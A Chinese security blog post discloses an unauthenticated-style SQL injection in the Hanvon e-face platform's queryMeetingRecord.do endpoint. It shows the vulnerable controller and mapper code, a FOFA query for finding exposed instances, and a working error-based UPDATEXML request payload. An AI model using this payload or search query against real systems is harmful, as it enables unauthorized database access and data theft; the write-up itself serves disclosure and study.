---
title: "汉王e脸通综合管理平台 queryMeetingRecord.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-queryMeetingRecord-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-querymeetingrecord.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 queryMeetingRecord.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/3 08:31
* 486浏览
* [0评论](#comment)
* 52分钟阅读

深入探索

身份验证

认证

鉴权


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理软件，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `queryMeetingRecord.do` 接口存在 [SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入检测工具

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

深入探索

应用

数据库

应用程序

直接看 `MobiMeetingAppController` 里关于 `queryMeetingRecord` 的实现

```
@ResponseBody
    @RequestMapping(
        value = {"/queryMeetingRecord.do"},
        method = {RequestMethod.GET}
    )
    public MethodResult queryMeetingRecord(@RequestParam(required = false,value = "page") Integer page, @RequestParam(required = false,value = "pageSize") Integer pageSize, @RequestParam(required = false,value = "start") String start, @RequestParam(required = false,value = "end") String end, @RequestParam(required = false,value = "meetingName") String meetingName, @RequestParam(required = false,value = "meetingRoom") Long meetingRoomId, @RequestParam(required = false,value = "state") Integer state, @RequestParam(required = false,value = "columnKey") String columnKey, @RequestParam(required = false,value = "order") String order, @RequestHeader(required = false,value = "token") String token) {
        new MethodResult();
        MethodResult rst = this.getTokenUser(token);
        if (rst.isSuccess()) {
            UserTpm user = (UserTpm)rst.getResult();

            MethodResult methodResult;
            try {
                if (page == null) {
                    page = Constants.DEFAULT_START_PAGE_INDEX;
                }

                if (pageSize == null) {
                    pageSize = Constants.PAGE_SIZE;
                }

                MeetingParam meetingParam = new MeetingParam();
                meetingParam.setMtName(meetingName);
                meetingParam.setMrId(meetingRoomId);
                meetingParam.setMtStartTime(start);
                meetingParam.setMtEndTime(end);
                if (state != null) {
                    meetingParam.setState(state);
                }

                meetingParam.setColumnKey(columnKey);
                meetingParam.setOrder(order);
                PageHelper.startPage(page, pageSize);
                Long id = user.getId();
                meetingParam.setUserId(id);
                List<MeetingTpm> list = this.meetingAsm.queryMeetingByEmployeeId(meetingParam);
```

深入探索

系统平台

授权

SQL

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 MeetingDsm.xml

代码安全审计

```
<!--个人用户查询会议室预约记录列表-->
    <select id="queryMeetingByEmployeeId" parameterType="com.hanvon.iface.tpm.meeting.param.MeetingParam"
            resultMap="ResultMapVO">
        SELECT MT.ID,MT.MT_NAME,MT.MT_DATE,MT.MT_START_TIME,MT.MT_END_TIME,MT.MT_SIGNIN_STARTTIME,
        MT.MT_SIGNIN_ENDTIME,MT.MR_ID,MT.MT_CONTENT,MT.MT_DELETE,MT.MT_STATE,MT.MT_CREATE_TIME,MT.MT_DEVICE_ID,MT_IS_SIGNIN,MT_IS_SIGNOUT,
        MT.MT_DEVICE_NAME,MT.MT_SIGNOUT_STARTTIME,MT.MT_SIGNOUT_ENDTIME,SU.SZ_NAME as applicant,sb.sz_name as
        branchName,
        MMT.MR_NAME AS MRNAME,(SELECT COUNT(1) FROM mt_meeting_file MMF WHERE MMF.MT_ID = MT.ID) AS SUM
        FROM mt_meeting MT
        LEFT JOIN mt_meeting_room MMT ON MT.MR_ID = MMT.ID
        LEFT JOIN sys_user_sys SU ON MT.MT_CREATE_ID = SU.NG_ID
        LEFT JOIN sys_branch sb on sb.ng_id = (SELECT sub.ng_branch_id from sys_user_branch sub where sub.ng_user_id
        =MT.MT_CREATE_ID )
        WHERE MT.MT_DELETE = 1 AND MT.MT_STATE=1

        <if test="keys != null">
            AND (
            SU.SZ_NAME like CONCAT('%',#{keys},'%')
            OR MT_CREATE_ID like CONCAT('%',#{keys},'%')
            )
        </if>
        <if test="state != null and state != ''">
            AND MT.MT_STATE= #{state}
        </if>
        <if test="mtName != null and mtName != ''">
            AND MT.MT_NAME like CONCAT('%',#{mtName},'%')
        </if>
        <if test="mtStartTime != null">
            AND DATE(MT.MT_DATE) &gt;= DATE(#{mtStartTime,jdbcType=VARCHAR})
            AND DATE(#{mtEndTime,jdbcType=VARCHAR}) &gt;= DATE(MT.MT_DATE)
            AND (MT.ID in (SELECT me.mt_id from mt_meeting_employee me where me.me_id=#{userId})
                  or (MT_CREATE_ID = #{userId})
            )
        </if>
        <if test="mrId != null">
            and MT.MR_ID = #{mrId}
        </if>
        <if test="mtDate != null">
            and MT.MT_DATE = #{mtDate,jdbcType=VARCHAR}
        </if>
        ORDER BY
        <if test="order == null or order == ''">
            MT.MT_CREATE_TIME desc
        </if>
        <if test="order != null and order != ''">
            ${columnKey} ${order}
        </if>
    </select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

> 需要一个合法的 token，参考 [wxLogin.do 信息泄露](https://mrxn.net/jswz/hanvon-efacego-wxLogin-auth-bypass-data-leak.html)获取

```
GET /manage/mobiMeetingApp/queryMeetingRecord.do?begin=&branchId=1&end=&page=1&pageSize=10&year=2025&recordId=1&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(2920=2920,1)))),8357)) HTTP/1.1
Host: hanvon.mrxn.net
token: xxxxxx
```

[![汉王e脸通综合管理平台 queryMeetingRecord.do SQL注入漏洞](images/img-001-16332eff0aa0.webp)](https://image.mrxn.net/cbfb45e6e58e46d78ca33953413bfc1a.webp)

成功通过报错注入爆出数据库版本信息

漏洞预警服务

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[汉王e脸通综合管理平台 queryMeetingRecord.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryMeetingRecord-sqli.html)  
文章链接：<https://mrxn.net/jswz/hanvon-efacego-queryMeetingRecord-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-queryMeetingRecord-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAK30lEQVR4Aeyc0XbcNgxE9/b//7n1BL2yCIkrOXG8+8CcoKMZDEAuQTV2kvafx+Px7+/Ev///uFv7v/2w1l1dX8f9+ubU5KK6qD5DfeKVz7z+38EM5KNu/XyXE9gG8jHdx52Ybdxa83IReACmNwROdQ3Wy2H0mw9C5fKc6DXREl3vHJ73gcpDofUds9ad2NdtA9mL6/l1J3AYCNTUYcSrLUL5uw9K96b0vNy8qC7C2AeKwydaC6VZK8Ko6zcvqkP55R31XyFUHxjxrO4wkDPT0n7uBP54IN6aqy1D3Q591onqIpQfCrs+q4vPHIy1yZ0FlM+67oHKQ2HPz+q67w7/44HcWWR57p/Atw2k3xKo26TeESrvVqE4FKrPEI4+KA0Ke6176PqM6xe7b6Z331f4tw3kK4su7/wEDgNx6h1nLeDkNp6YoXxQ2C19PXn3yc2f4cwDtbY1MHLroPTOe535K7Su41ndYSBnpqX93AlsA4G6FfAc727N2wDVT269HCqvDiNX1y8XofyA0gGBX78bYA8454fCmwJUv26H0uE57uu2gezF9fy6E/jHW/NVnG3ZPlC3YuaD8/zdevvqD6qJUGskl4CR6xPhXl6/mN6JzqN9NdYb4im+CR4GAnVLYET3C6XLRSgdCvvNgFG3ToTKQ6H15jtC+eCI3Su/6mkexp7qov1EGP0wcn0ijHn45IeBWLTwNSfwD9R0+vKz23Cl9zx8rb/7gLEORq7P9YJdk8NYC8WhMLUJ/Xnehzo89+u7i66x9683ZH8ab/C8fZU124tThLodMKJ1ULq846yP+g08/RNNqHWBbUlg+L7DBIy6a/Y8lA8KzeuHUYeR67Ouo3kY6+Jbb0hO4Y1i+zUEalp9ejDq5vtn6DpUnT4YuX4YdRh5r4fzvL6gvfOc6BzGHlC8++RQ+fQ6C309pw7P6/d16w3Zn8YbPB8GAjVNp9v3CGNeH5SuX10+wysfVF99IpQ+63tHh+rx1Z7dD+d9YNTdE4y6/YKHgVi08DUnsA0k00n0bURLwDhVKK4/ngSc690nh9GvLqZnQn4HoXrCiOmzD3tB+cypd4Tydd06GPNdh8qr9z7h20BCVrz+BLaBwDg9KA6FbhXOOZTepw+jDsXt1/2dQ/lhRH17vNtz5oNaw54wcuug9M6tE6F8ctE6EcoHPLaBPNaPtziB2wNxujOcfRr9s7w6fN4S+Hw2P+sDn149UJq1HWGX/0ha9/E4/Oy6XBzMHwTO+0LpUPhhHX7aL3h7IEOHRf7aCRwGAuMUM7UElA4jurN4EvKOUHUzPbWJnpdD1ceTUH+G8SX0wNgDikNhvInuh8pDoXkxNftQh/Lvc3nueXnwMJCIK153AttAMrl99C3tc/tnqFsAI/Z6ubVQfnXRvNh1uagvCOc9ofR4EjDyaAko3d4d40mo5zkBVQeF5kUoHUZMbUJfcBtIyIrXn8A2EBin59ag9BnPhBPmRRjr1DumNtH1zqH6wRxnNepQtVkvAcXNR0vIO8Loh5GnNgGj3vvEk4DywSduA+lFi7/mBA4DyeT24bagpmhOXez6XQ7VFwrtJ9pH7Lo8OPOoi/Em5FBrw4jxJPTlOQHl63pyz6L75Xs8DORZw5X7+ycwHQjULXALThFG3Tw816HyUGidfeVX+MwPY+/eCyoPhT0v72vAuR/O9cfjYatfOOsHx/rpQH51Wv/48RM4/K0TqKn1qbqzrsM9v3UiVN1VXygfjGjdGbpGz6mLs3zX5dbNEGqP3S8Xe716cL0hOYU3iu1vnTi12d6gpg8j6ofSZ32g8lCoD4pDof3MzziMfn1BmOeSnwVUHRTq63uBysOI+kX4Wh5Yfx